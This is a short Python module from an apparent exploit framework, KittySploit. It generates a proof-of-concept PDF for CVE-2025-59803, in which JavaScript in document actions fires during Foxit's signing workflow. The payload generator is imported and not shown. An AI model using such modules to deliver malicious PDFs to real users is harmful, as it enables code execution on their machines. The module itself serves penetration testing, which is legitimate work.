#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.pdf.mixins import PdfCveMixin
from lib.pdf.generators.viewer_cve import write_foxit_ocg_signing_js


class Module(Auxiliary, PdfCveMixin):
    __info__ = {
        "name": 'PDF CVE-2025-59803 Foxit OCG Signing Trigger',
        "description": 'Generate PDF PoC for CVE-2025-59803: JavaScript in /AA /WP and /DP fires during Foxit digital signing workflow (OCG).',
        "author": ["KittySploit Team"],
        "cve": ['CVE-2025-59803'],
        "references": ['https://nvd.nist.gov/vuln/detail/CVE-2025-59803'],
        "tags": ['pdf', 'cve-2025-59803', 'foxit', 'ocg', 'javascript'],
    }

    PDF_GENERATORS = (
        write_foxit_ocg_signing_js,
    )

    CVE_IDS = ['CVE-2025-59803']
    MODULE_TITLE = 'PDF CVE-2025-59803 Foxit OCG Signing Trigger'

    def run(self):
        return self.run_pdf_cve()